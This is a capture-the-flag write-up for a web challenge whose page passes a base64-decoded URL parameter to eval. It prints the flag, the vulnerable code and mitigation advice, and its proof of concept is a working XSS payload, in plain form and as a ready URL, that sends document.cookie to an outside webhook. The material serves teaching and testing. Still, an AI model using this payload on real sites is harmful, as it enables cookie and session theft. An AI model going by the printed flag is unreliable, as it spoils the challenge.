# Challenge Name:
cross-site

## Description:
basic vuln that can be so many $$$ in bounties

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{easy_xss_with_encoded_payload_00fe4bacb1dd}`

## Points:
500

## Author:
k.eii

## PoC
```
    if (url.searchParams.has("key")) {
        let key = url.searchParams.get("key");

        try {
            key = atob(key);
            if (key.includes("run")) {
                eval(key.replace("run", ""));
```
eval key param (base64 encoded needed because of atob)

payload:
`run(fetch('https://webhook.site/b25e1e98-59b2-493d-8c47-90b97d9aa25f?' + document.cookie));`

`http://proxy/?key=cnVuKGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9iMjVlMWU5OC01OWIyLTQ5M2QtOGM0Ny05MGI5N2Q5YWEyNWY/JyArIGRvY3VtZW50LmNvb2tpZSkpOw==`

## Vulnerability Analysis
This challenge demonstrates a classic Cross-Site Scripting (XSS) vulnerability via insecure use of `eval` on user-controlled input in JavaScript.

### Vulnerable Code
```js
if (url.searchParams.has("key")) {
    let key = url.searchParams.get("key");
    try {
        key = atob(key);
        if (key.includes("run")) {
            eval(key.replace("run", ""));
        } else {
            console.log("Invalid key!");
        }
    } catch (e) {
        console.log("Error decoding key!");
    }
}
```
- The code takes the `key` parameter from the URL, decodes it from base64, and if it contains the string `run`, it strips `run` and passes the rest directly to `eval()`.
- This allows an attacker to execute arbitrary JavaScript in the context of the page by crafting a payload, base64-encoding it, and passing it as the `key` parameter.

### Exploitation Steps
1. **Craft a Payload:**
   Write a JavaScript payload, e.g., `run(fetch('https://webhook.site/your-id?' + document.cookie));`
2. **Base64 Encode:**
   Encode the payload using base64, e.g., `cnVuKGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9iMjVlMWU5OC01OWIyLTQ5M2QtOGM0Ny05MGI5N2Q5YWEyNWY/JyArIGRvY3VtZW50LmNvb2tpZSkpOw==`
3. **Exploit:**
   Visit the site with the payload as a URL parameter:  
   `http://proxy/?key=BASE64_PAYLOAD`
   The code will execute in the victim's browser, allowing cookie theft or other attacks.

### Why This Works
- The use of `eval` on user input is inherently dangerous, especially when no proper validation or sanitization is performed.
- Base64 encoding does not provide any security, it only obfuscates the payload.

### Mitigation
- Never use `eval` on user-supplied input.
- If dynamic code execution is required, use safe alternatives or strict input validation.
- Always encode and sanitize user input before using it in the DOM or scripts.
